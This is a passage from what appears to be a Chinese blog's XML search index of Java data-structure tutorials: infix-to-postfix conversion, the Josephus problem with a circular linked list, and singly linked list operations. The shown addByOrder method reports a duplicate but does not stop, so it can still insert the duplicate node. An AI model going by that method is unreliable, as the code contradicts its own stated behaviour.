function_">parseSuffixExpreesionList</span><span class="params">(List&lt;String&gt; ls)</span> &#123;</span><br><span class="line">Stack&lt;String&gt; stack = <span class="keyword">new</span> <span class="title class_">Stack</span>&lt;String&gt;();</span><br><span class="line">List&lt;String&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;String&gt;();</span><br><span class="line"><span class="keyword">for</span> (String ele : ls) &#123;</span><br><span class="line"><span class="keyword">if</span> (ele.matches(<span class="string">&quot;\\d+&quot;</span>)) &#123;</span><br><span class="line">list.add(ele);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (ele.equals(<span class="string">&quot;(&quot;</span>)) &#123;</span><br><span class="line">stack.push(ele);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (ele.equals(<span class="string">&quot;)&quot;</span>)) &#123;</span><br><span class="line"><span class="keyword">while</span> (!stack.peek().equals(<span class="string">&quot;(&quot;</span>)) &#123;<span class="comment">//peek查看并没有pop出去</span></span><br><span class="line">list.add(stack.pop());</span><br><span class="line">&#125;</span><br><span class="line">stack.pop();<span class="comment">//把括号pop出去，并没有加入list</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;<span class="comment">//运算符的判断</span></span><br><span class="line"><span class="keyword">while</span> (stack.size() != <span class="number">0</span> &amp;&amp; priority(ele) &lt;= priority(stack.peek())) &#123;</span><br><span class="line">list.add(stack.pop());</span><br><span class="line">&#125;</span><br><span class="line">stack.push(ele);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> (stack.size() != <span class="number">0</span>) &#123;</span><br><span class="line">list.add(stack.pop());</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> list;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
          <category> 数据结构和算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 栈 </tag>
            
            <tag> 中缀表达式 </tag>
            
            <tag> 后缀表达式 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>环形链表和约瑟夫问题</title>
      <link href="/posts/bee0/"/>
      <url>/posts/bee0/</url>
      
        <content type="html"><![CDATA[<h1 id="约瑟夫（Josephu）问题"><a href="#约瑟夫（Josephu）问题" class="headerlink" title="约瑟夫（Josephu）问题"></a>约瑟夫（Josephu）问题</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>约瑟夫问题（约瑟夫环、丢手绢问题）为：设编号为1，2，…n的n个人围坐一圈，约定编号为k（1&lt;&#x3D;k&lt;&#x3D;n）的人从1开始报数，数到m的那个人出列，它的下一位又从1开始报数，数到m的那个人又出列，依次类推，直到所有人出列为止，由此产生一个出队编号的序列。</p><hr><h2 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h2><p>用一个不带头结点的循环链表来处理Josephu问题：先构成一个有n个结点的单循环链表，然后由k结点起从1开始计数，计到m时，对应结点从链表中删除，然后再从被删除结点的下一个结点又从1开始计数，直到最后一个结点从链表中删除算法结束。</p><hr><h2 id="创建Boy-小孩-对象，每一个对象就是一个节点"><a href="#创建Boy-小孩-对象，每一个对象就是一个节点" class="headerlink" title="创建Boy(小孩)对象，每一个对象就是一个节点"></a>创建Boy(小孩)对象，每一个对象就是一个节点</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Boy</span> &#123;</span><br><span class="line"><span class="keyword">private</span> <span class="type">int</span> no;</span><br><span class="line"><span class="keyword">private</span> Boy next;</span><br><span class="line">    </span><br><span class="line"><span class="keyword">public</span> <span class="title function_">Boy</span><span class="params">(<span class="type">int</span> no)</span> &#123;</span><br><span class="line"><span class="built_in">this</span>.no = no;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getNo</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">return</span> no;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setNo</span><span class="params">(<span class="type">int</span> no)</span> &#123;</span><br><span class="line"><span class="built_in">this</span>.no = no;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> Boy <span class="title function_">getNext</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">return</span> next;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setNext</span><span class="params">(Boy next)</span> &#123;</span><br><span class="line"><span class="built_in">this</span>.next = next;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;Boy [no=&quot;</span> + no + <span class="string">&quot;]&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="构建单向环形链表思路以及代码实现"><a href="#构建单向环形链表思路以及代码实现" class="headerlink" title="构建单向环形链表思路以及代码实现"></a>构建单向环形链表思路以及代码实现</h2><blockquote><ol><li>先创建第一个节点, 让 first 一直指向该节点</li><li>再创建一个辅助指针(变量) curBoy，指向first节点</li><li>每创建一个新节点，就让curBoy的next指向新节点，新节点的next指向first，curBoy再指向新节点</li></ol></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">CircleSingleLinkedList</span> &#123;</span><br><span class="line"><span class="keyword">private</span> <span class="type">Boy</span> <span class="variable">first</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addBoy</span><span class="params">(<span class="type">int</span> nums)</span> &#123;</span><br><span class="line"><span class="comment">// 数据校验</span></span><br><span class="line"><span class="keyword">if</span> (nums &lt; <span class="number">1</span>) &#123;</span><br><span class="line">System.out.println(<span class="string">&quot;nums的值不正确！&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">Boy</span> <span class="variable">curBoy</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt;= nums; i++) &#123;</span><br><span class="line"><span class="type">Boy</span> <span class="variable">boy</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Boy</span>(i);</span><br><span class="line"><span class="comment">// 当i=1时。另外处理</span></span><br><span class="line"><span class="keyword">if</span> (i == <span class="number">1</span>) &#123;</span><br><span class="line">first = boy;</span><br><span class="line">first.setNext(first);</span><br><span class="line">curBoy = boy;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">curBoy.setNext(boy);</span><br><span class="line">boy.setNext(first);</span><br><span class="line">curBoy = boy;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="遍历环形链表的思路以及代码实现"><a href="#遍历环形链表的思路以及代码实现" class="headerlink" title="遍历环形链表的思路以及代码实现"></a>遍历环形链表的思路以及代码实现</h2><blockquote><ol><li><p>先让一个辅助指针(变量) curBoy，指向first节点</p></li><li><p>然后通过一个while循环遍历该环形链表，直到curBoy.next  &#x3D;&#x3D; first时结束</p></li></ol></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">CircleSingleLinkedList</span> &#123;</span><br><span class="line"><span class="keyword">private</span> <span class="type">Boy</span> <span class="variable">first</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">showBoy</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="comment">// 判断链表是否为空</span></span><br><span class="line"><span class="keyword">if</span> (first == <span class="literal">null</span>) &#123;</span><br><span class="line">System.out.println(<span class="string">&quot;链表为空，没有小孩。&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">Boy</span> <span class="variable">curBoy</span> <span class="operator">=</span> first;</span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">System.out.println(<span class="string">&quot;当前小孩编号为：&quot;</span> + curBoy.getNo());</span><br><span class="line"><span class="keyword">if</span> (curBoy.getNext() == first) &#123;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">curBoy = curBoy.getNext();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="小孩出圈的思路以及代码实现"><a href="#小孩出圈的思路以及代码实现" class="headerlink" title="小孩出圈的思路以及代码实现"></a>小孩出圈的思路以及代码实现</h2><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20200726155912.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> startNo  从第几个小孩开始报数</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> countNum 数多少下</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> nums     环形链表的总人数</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">countBoy</span><span class="params">(<span class="type">int</span> startNo, <span class="type">int</span> countNum, <span class="type">int</span> nums)</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (startNo &gt; nums || startNo &lt; <span class="number">1</span> || first == <span class="literal">null</span> || countNum &lt; <span class="number">1</span>) &#123;</span><br><span class="line">System.out.println(<span class="string">&quot;参数错误，请重新输入！&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">Boy</span> <span class="variable">helper</span> <span class="operator">=</span> first;</span><br><span class="line">       <span class="comment">// 使helper指向链表最后一个节点，紧跟在first后面</span></span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (helper.getNext() == first) &#123;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">helper = helper.getNext();</span><br><span class="line">&#125;</span><br><span class="line">       <span class="comment">// 使first指向开始喊数的节点</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; startNo; i++) &#123;</span><br><span class="line">first = first.getNext();</span><br><span class="line">helper = helper.getNext();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">           <span class="comment">// 只剩最后一个节点</span></span><br><span class="line"><span class="keyword">if</span> (helper == first) &#123;</span><br><span class="line">System.out.printf(<span class="string">&quot;最后一个编号为%d的小孩出圈。\n&quot;</span>, first.getNo());</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">           <span class="comment">// 开始喊数，first指向喊数者</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; countNum; i++) &#123;</span><br><span class="line">first = first.getNext();</span><br><span class="line">helper = helper.getNext();</span><br><span class="line">&#125;</span><br><span class="line">System.out.printf(<span class="string">&quot;编号为%d的小孩出圈。\n&quot;</span>, first.getNo());</span><br><span class="line">helper.setNext(first.getNext());</span><br><span class="line">first = first.getNext();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
          <category> 数据结构和算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 环形链表 </tag>
            
            <tag> 约瑟夫问题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>单向链表和双向链表</title>
      <link href="/posts/c5d5/"/>
      <url>/posts/c5d5/</url>
      
        <content type="html"><![CDATA[<h1 id="链表（Linked-List）介绍"><a href="#链表（Linked-List）介绍" class="headerlink" title="链表（Linked List）介绍"></a>链表（Linked List）介绍</h1><p>链表是有序的列表，它在内存中存储如下：</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220706215658.png"></p><blockquote><ol><li>链表是以节点的方式来存储，是<strong>链式存储</strong></li><li>每个节点包含data域和指针域</li><li>如图：链表的<strong>各个节点不一定是连续存储</strong></li><li>链表分<strong>带头节点的链表</strong>和<strong>没有头节点的链表</strong>，根据实际的需求来确定</li></ol></blockquote><p>带头结点的单向链表示意图如下：</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220706215659.png"></p><p>带头结点的双向链表示意图如下：</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20200726010536.png"></p><h1 id="单向链表的应用实例"><a href="#单向链表的应用实例" class="headerlink" title="单向链表的应用实例"></a>单向链表的应用实例</h1><p>使用带头结点的单向链表，实现水浒英雄排行榜对英雄人物的增删改查操作。</p><hr><h2 id="创建Hero对象，每一个对象就是一个节点"><a href="#创建Hero对象，每一个对象就是一个节点" class="headerlink" title="创建Hero对象，每一个对象就是一个节点"></a>创建Hero对象，每一个对象就是一个节点</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">HeroNode</span> &#123;</span><br><span class="line">    <span class="comment">// data域</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> no;</span><br><span class="line"><span class="keyword">public</span> String name;</span><br><span class="line"><span class="keyword">public</span> String nickname;</span><br><span class="line">    <span class="comment">// next域</span></span><br><span class="line"><span class="keyword">public</span> HeroNode next;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">HeroNode</span><span class="params">(<span class="type">int</span> no, String name, String nickname)</span> &#123;</span><br><span class="line"><span class="built_in">this</span>.no = no;</span><br><span class="line"><span class="built_in">this</span>.name = name;</span><br><span class="line"><span class="built_in">this</span>.nickname = nickname;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;HeroNode [no=&quot;</span> + no + <span class="string">&quot;, name=&quot;</span> + name + <span class="string">&quot;, nickname=&quot;</span> + nickname + <span class="string">&quot;]&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="添加英雄时，直接添加到链表尾部"><a href="#添加英雄时，直接添加到链表尾部" class="headerlink" title="添加英雄时，直接添加到链表尾部"></a>添加英雄时，直接添加到链表尾部</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//定义SingleLinkedList 管理我们的英雄</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SingleLinkedList</span> &#123;</span><br><span class="line"><span class="comment">// 初始化一个头节点</span></span><br><span class="line"><span class="keyword">private</span> <span class="type">HeroNode</span> <span class="variable">head</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HeroNode</span>(<span class="number">0</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 返回头节点</span></span><br><span class="line"><span class="keyword">public</span> HeroNode <span class="title function_">getHead</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">return</span> head;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 添加节点到单向链表</span></span><br><span class="line"><span class="comment">// 思路，当不考虑编号顺序时</span></span><br><span class="line"><span class="comment">// 1. 找到当前链表的最后节点</span></span><br><span class="line"><span class="comment">// 2. 将最后这个节点的next 指向 新的节点</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">add</span><span class="params">(HeroNode heroNode)</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 因为head节点不能动，因此我们需要一个辅助节点temp，用于遍历</span></span><br><span class="line">        <span class="comment">// 使它指向链表的头结点，相当于C语言的指针</span></span><br><span class="line"><span class="type">HeroNode</span> <span class="variable">temp</span> <span class="operator">=</span> head;</span><br><span class="line"><span class="comment">// 遍历链表，找到最后一个节点</span></span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line"><span class="comment">// 判断temp指向的节点是否为最后一个节点</span></span><br><span class="line"><span class="keyword">if</span> (temp.next == <span class="literal">null</span>) &#123;<span class="comment">//</span></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 如果没有找到最后节点, 将temp往后移</span></span><br><span class="line">temp = temp.next;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 当退出while循环时，temp就指向了链表的最后一个节点</span></span><br><span class="line"><span class="comment">// 将最后这个节点的next 指向 新的节点</span></span><br><span class="line">temp.next = heroNode;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 显示链表[遍历]</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">list</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (head.next == <span class="literal">null</span>) &#123;</span><br><span class="line">System.out.println(<span class="string">&quot;链表为空&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">HeroNode</span> <span class="variable">temp</span> <span class="operator">=</span> head.next;</span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line"><span class="comment">// 输出节点的信息</span></span><br><span class="line">System.out.println(temp);</span><br><span class="line"><span class="keyword">if</span> (temp.next == <span class="literal">null</span>) &#123;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 将temp后移</span></span><br><span class="line">temp = temp.next;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="添加英雄时，根据英雄排名添加到指定位置"><a href="#添加英雄时，根据英雄排名添加到指定位置" class="headerlink" title="添加英雄时，根据英雄排名添加到指定位置"></a>添加英雄时，根据英雄排名添加到指定位置</h2><p>如果有这个排名，则添加失败，并给出提示。如图，s为新节点，只需<code>s-&gt;next = p-&gt;next;p-&gt;next = s;</code></p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220706215700.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">SingleLinkedList</span> &#123; <span class="comment">//具体实现方法，与上面同一个类</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addByOrder</span><span class="params">(HeroNode heroNode)</span> &#123;</span><br><span class="line"><span class="type">HeroNode</span> <span class="variable">temp</span> <span class="operator">=</span> head;</span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (temp.next == <span class="literal">null</span> || temp.next.no &gt; heroNode.no) &#123;</span><br><span class="line">heroNode.next = temp.next;</span><br><span class="line">temp.next = heroNode;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(temp.next.no == heroNode.no)&#123;</span><br><span class="line">System.out.printf(<span class="string">&quot;准备插入的英雄的编号 %d 已经存在了, 不能加入\n&quot;</span>, heroNode.no);</span><br><span class="line">&#125;</span><br><span class="line">temp = temp.next;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="根据no编号修改英雄信息"><a href="#根据no编号修改英雄信息" class="headerlink" title="根据no编号修改英雄信息"></a>根据no编号修改英雄信息</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">SingleLinkedList</span> &#123;<span class="comment">//具体实现方法，与上面同一个类</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">update</span><span class="params">(HeroNode newHeroNode)</span> &#123;</span><br><span class="line"><span class="type">HeroNode</span> <span class="variable">temp</span> <span class="operator">=</span> head;</span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (temp.next == <span class="literal">null</span>) &#123;</span><br><span class="line">System.out.println(<span class="string">&quot;修改失败，没有找到该节点！&quot;</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span> (temp.next.no == newHeroNode.no) &#123;</span><br><span class="line">temp.next.name = newHeroNode.name;</span><br><span class="line">temp.next.nickname = newHeroNode.nickname;</span><br><span class="line">System.out.println(<span class="string">&quot;修改成功：&quot;</span> + temp.next);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125; </span><br><span class="line">temp = temp.next;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="根据no编号删除英雄信息"><a href="#根据no编号删除英雄信息" class="headerlink" title="根据no编号删除英雄信息"></a>根据no编号删除英雄信息</h2><p>如图，p-&gt;next为要删除的节点，只需<code>p-&gt;next = p-&gt;next-&gt;next;</code>。<strong>被删除的节点，将不会有其它引用指向，会被垃圾回收机制回收。</strong></p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220706215701.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">SingleLinkedList</span> &#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">del</span><span class="params">(<span class="type">int</span> no)</span> &#123;</span><br><span class="line"><span class="type">HeroNode</span> <span class="variable">temp</span> <span class="operator">=</span> head;</span><br><span class="line"><span class="keyword">while</span>(<span class="literal">true</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (temp.next == <span class="literal">null</span>) &#123;</span><br><span class="line">System.out.println(<span class="string">&quot;找不到该节点，无法删除！&quot;</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span> (temp.next.no == no) &#123;</span><br><span class="line">temp.next= temp.next.next;</span><br><span class="line">System.out.printf(<span class="string">&quot;编号为 %d 的英雄删除成功!\n&quot;</span>,no);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">temp = temp.next;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><p><strong>注意：在执行修改和删除操作时必须先判断temp.next为不为空，否则容易出现异常。</strong></p><hr><h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span 